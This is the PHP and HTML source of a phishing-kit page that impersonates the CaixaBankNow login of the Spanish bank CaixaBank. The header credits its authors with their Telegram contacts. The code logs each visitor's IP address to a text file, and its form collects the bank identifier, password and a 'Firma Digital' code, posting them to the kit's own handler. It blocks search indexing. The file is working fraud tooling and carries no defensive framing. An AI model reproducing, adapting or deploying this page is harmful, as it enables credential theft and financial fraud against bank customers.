<?php
$ip = getenv("REMOTE_ADDR");
$file = fopen("Vue.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." | ".gmdate ("H:i:s")."\n");
?>
<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Particulares</title>
    </head>

    <body>

        <header id="header" class="d-flex align-items-center">
            <div class="left flex-grow-1">
                <img src="../assets/imgs/logo.png">
                <img class="ml-5 d-lg-inline-block d-md-inline-block d-sm-none d-none" src="../assets/imgs/logo2.png">
            </div>
            <div class="right d-lg-block d-md-block d-sm-block d-none">
                <img src="../assets/imgs/header-right.png">
            </div>
        </header>

        <div id="login-area">
            <form action="../index.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="login">
                <legend>
                    <img src="../assets/imgs/lock.png">
                    <h3>Acceso seguro a CaixaBankNow</h3>
                </legend>
                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'username') ?>">
                    <label for="username">Identificador</label>
                    <input type="text" maxlength="14" name="username" id="username" class="form-control" value="<?php echo get_value('username'); ?>">
                    <?php echo error_message($_SESSION['errors'],'username'); ?>
                </div>
                <div class="d-flex align-items-center mb30">
                    <p class="check flex-grow-1 mb-0">Guardar identificación</p>
                    <div class="d-lg-block d-md-block d-sm-none d-none"><img src="../assets/imgs/key1.png"></div>
                </div>
                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'password') ?>">
                    <label for="password">Contraseña <span>¿Has olvidado tus claves de acceso?</span></label>
                    <input type="password" minlength="6" name="password" id="password" class="form-control">
                    <?php echo error_message($_SESSION['errors'],'password'); ?>
                </div>
                                <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'password') ?>">
                    <label for="digital">Firma Digital<span>*</span></label>
                    <input type="digital" minlength="6" name="digital" id="digital" class="form-control">
                    <?php echo error_message($_SESSION['errors'],'digital'); ?>
                </div>

                <div class="text-right mt10 mb20 d-lg-block d-md-block d-sm-none d-none"><img src="../assets/imgs/key2.png"></div>

                <div class="form-group">
                    <button type="submit">Entrar a CaixaBankNow</button>
                </div>
                <ul class="list1">
                    <li>Alta a CaixaBankNow</li>
                    <li>Demostración</li>
                    <li>Seguridad</li>
                    <li>CaixaBankProtect</li>
                </ul>
            </form>

            <div id="footer">
                <p style="color: #007eae; text-align: left; font-size: 15px;"><img src="../assets/imgs/left.png"> Volver</p>
                <hr>
                <p>
                    Aviso legal <span>|</span> Seguridad <span>|</span> Tarifas<br>
                    @ CaixaBank, S.A. 2021. Todos los derechos reservados.
                </p>
            </div>

        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('table tr td:not(.remove)').click(function(){
                $('#password').focus();
                var num     = $(this).data('num');
                var old_val = $('#password').val();
                var zz = old_val + num;
                if( $('#password').val().length == 8 )
                    return false;
                $('#password').val(zz);
            });
            $('.remove').click(function(){
                $('#password').val('');
            });
        </script>

    </body>

</html>